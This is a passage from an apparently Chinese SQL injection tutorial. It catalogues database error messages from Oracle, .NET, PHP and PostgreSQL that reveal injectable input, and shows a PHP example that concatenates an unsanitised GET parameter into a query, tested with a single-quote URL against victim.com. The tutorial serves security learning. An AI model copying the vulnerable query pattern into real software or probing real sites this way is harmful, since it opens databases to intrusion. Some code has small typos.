&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Error: SQLExceptionjava&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SQLException: ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01756&lt;/span&gt;: quoted string &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; properly &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;.NET环境下的注入单引号情况：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Exception Details: System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OleDb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OleDbException: One &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; more &lt;span class=&#34;token keyword&#34;&gt;errors&lt;/span&gt; occurred during processing &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; command&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00933&lt;/span&gt;: &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; command &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; properly ended&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面的例子展示了从.NET应用返回的一个错误，该程序执行的语句中包含未使用单引号 引起来的字符串：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01756&lt;/span&gt;: quoted string &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; properly &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt;
System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Web&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;HttpUnhandledException: Exception &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;System.Web.HttpUnhandledException&#39;&lt;/span&gt; was thrown&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&amp;gt;&lt;/span&gt;
System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OleDb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OleDbException: ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01756&lt;/span&gt;: quoted string &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; properly &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PHP的ociparse()函数用于准备要执行的Oracle语句。下面是该函数调用失败时PHP引擎 产生的一个错误示例：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Warning: ociparse &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ociparse&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; : ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01756&lt;/span&gt;: quoted string &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; properly &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;victim&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;ocitest&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;31&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果ociparse()函数调用失败且未对该错误进行处理，那么应用会因为第一次失败而显示一 些其他错误，如下所示：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Warning: ociexecute&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;: supplied argument &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; a valid OCI8&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Statement resource &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; c:\www\victim&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com\oracle\&lt;span class=&#34;token keyword&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;31&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;分析报错代码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SQLException: ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00907&lt;/span&gt;: missing &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; parenthesis atoracle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbaccess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DBError&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;throwSqlException&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;DBError&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;134&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; at oracle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ttc7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TTIoer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;processError&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;TTIoer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;289&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; at
oracle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ttc7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Oall7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;receive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Oall7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;582&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; at
oracle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ttc7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TTC7Protocol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;doOall7&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;TTC7Protocol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;1986&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库报告SQL语句中存在”missing right parenthesis”(缺少右括号)错误。很多原因会引发该错误。最常见的情况是攻击者在嵌套SQL语句中拥有某种控制权。例如：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; fieldl&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; field2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;/* 选择第一和第二个字段 */&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; fieldl        &lt;span class=&#34;token comment&#34;&gt;/* 开始子查询 */&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; table2
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; something &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;attacker controlled variable&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;/* 结束子查询 */&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; field3                        &lt;span class=&#34;token comment&#34;&gt;/*从子査询返回*/&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tablel&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上述例子展示了一个嵌套查询。主SELECT语句执行括号中的另一条SELECT语句。如果攻击者向第二条查询语句注入某些内容并将后面的SQL语句注释掉，那么Oracle将返回”missing right parenthesis” 错误。&lt;/p&gt;
&lt;h6 id=&#34;PostgreSQL错误&#34;&gt;&lt;a href=&#34;#PostgreSQL错误&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL错误&#34;&gt;&lt;/a&gt;PostgreSQL错误&lt;/h6&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//连接并选择数据库&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$dbconn&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_connect&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;host=localhost dbname=books user=tom password=myPassword&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Could not connect:	&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;pg_last_error&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//执行SQL查询&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$query&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM \&#34;public\&#34;.\&#34;Authors\&#34; WHERE name=&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;/span&gt;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$dbconnz&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Query failed: &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;pg_last_error&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//将查询结果以THTML形式输出&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;table&amp;gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_fetch_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;PGSQL_ASSOC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\t&amp;lt;tr&amp;gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$col_value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\t\t&amp;lt;td&amp;gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$col_value&lt;/span&gt;&lt;/span&gt;&amp;lt;/td&amp;gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\t&amp;lt;/tr&amp;gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;/table&amp;gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//释放结果集&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_free_result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//关闭连接&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$dbconn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;pg_query&lt;/code&gt;使用传入的数据库执行sql查询语句&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pg_last_error&lt;/code&gt;获取数据库连接的最新出错信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/list_author.php?name=&#39;&lt;/span&gt;
Query failed: ERROR: unterminated quoted string at &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#39;&#34;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;代码由于其他原因执行失败时&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;PostgreSQL数据库将返回一个常规错误：
Query failed: ERROR: syntax error at &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PostgreSQL开发，利用PostgreSQL JDBC Driver&lt;/p&gt;
&lt;p&gt;PostgreSQL JDBC Driver处理缺少结束引号的字符串时，会有下面的报错&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;util&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PSQLException: ERROR: unterminated quoted string at &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#34;&#39;\&#39; &#34;&lt;/span&gt;
at org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;core&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;v3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;QueryExecutorlmpl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;receiveErrorResponse&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Query ExecutorImpl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;1512&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
at org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;core&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;v3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;QueryExecutorlmpl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;processResults&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Query
ExecutorImpl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;1297&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
at org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;core&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;v3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;QueryExecutorlmpl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;QueryExecutorlmpl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; java:&lt;span class=&#34;token number&#34;&gt;188&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
at org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AbstractJdbc2Statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AbstractJdbc2Statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;430&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
at org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AbstractJdbc2Statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;executeWithFlags &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AbstractJdbc2Statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;332&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
at org・postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AbstractJdbc2Statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;executeQuery
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AbstractJdbc2Statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;231&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
at org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;postgresql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AbstractJdbc2DatabaseMetaData&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getTables &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AbstractJdbc2DatabaseMetaData&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;2190&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

